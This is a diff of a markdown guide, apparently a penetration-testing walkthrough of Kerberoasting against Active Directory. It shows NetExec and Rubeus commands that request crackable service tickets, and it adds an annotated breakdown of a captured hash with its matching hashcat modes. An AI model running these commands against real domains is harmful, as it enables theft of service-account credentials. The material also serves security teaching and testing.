@@ -96,11 +96,18 @@ nxc ldap $DC -u m.rossi -p 'Welcome2026!' --kerberoasting kerberoast.txt
 .\Rubeus.exe kerberoast /rc4opsec /outfile:kerberoast.txt
 ```
 
-<div class="img-placeholder">
-  <span class="ph-icon">🖼️</span>
-  <span class="ph-label">SCREENSHOT PLACEHOLDER</span>
-  <span class="ph-desc">GetUserSPNs listing SPN accounts + captured $krb5tgs$23$ hashes</span>
-</div>
+Anatomy of a Kerberoast hash — which tickets are crackable:
+
+```terminal
+$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/db01.corp.local:1433*$a91f...c30d
+     |    |   |        |          |                            |
+     |    |   |        |          |                            +-- enc-part: TGS encrypted with svc_sql's NT key
+     |    |   |        |          +-- SPN of the target service
+     |    |   |        +-- REALM
+     |    |   +-- service account sAMAccountName
+     |    +-- etype 23 (RC4)  ->  hashcat -m 13100
+     +-------- TGS-REP roast marker      (AES 17/18  ->  -m 19600 / 19700)
+```
 
 ### 3. Crack offline with Hashcat
 
